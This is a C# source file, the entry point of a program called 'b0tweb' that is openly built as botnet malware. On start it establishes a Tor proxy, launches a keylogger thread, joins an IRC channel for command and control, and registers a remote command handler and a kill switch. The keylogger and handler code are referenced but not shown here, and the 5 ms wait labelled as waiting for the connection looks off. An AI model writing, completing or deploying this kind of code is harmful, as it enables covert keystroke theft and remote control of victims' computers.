using System;
using System.Threading;
using b0tweb.MessageHandlers;

namespace b0tweb
{
    /// <summary>
    /// Startup class for our program.
    /// </summary>
    class Program
    {
        private const string Channel = "#b0tweb";

        /// <summary>
        /// Default main function to start the program.
        /// </summary>
        /// <param name="args">The command line arguments.</param>
        public static void Main(string[] args)
        {
            // Check if the old version is still stored.
            FileHelper.DeleteFile(FileHelper.GetBinaryOldPath());

            Console.WriteLine("Welcome to the b0tweb");

            TorProxy proxy = new TorProxy();
            proxy.Establish();

            Thread keyloggerThread = Keylogger.Run();

            Thread.Sleep(5); // wait for connection to be established

            Console.WriteLine("Connection to Tor successfuly established!");

            IRCConnectionController controller = new IRCConnectionController();

            controller.AddMessageHandler(new KillSwitchHandler(controller.Nick));
            controller.AddMessageHandler(new CommandMessageHandler(controller.Nick));

            controller.Join(Program.Channel);
            controller.Listen();

            proxy.Disconnect();
        }
    }
}
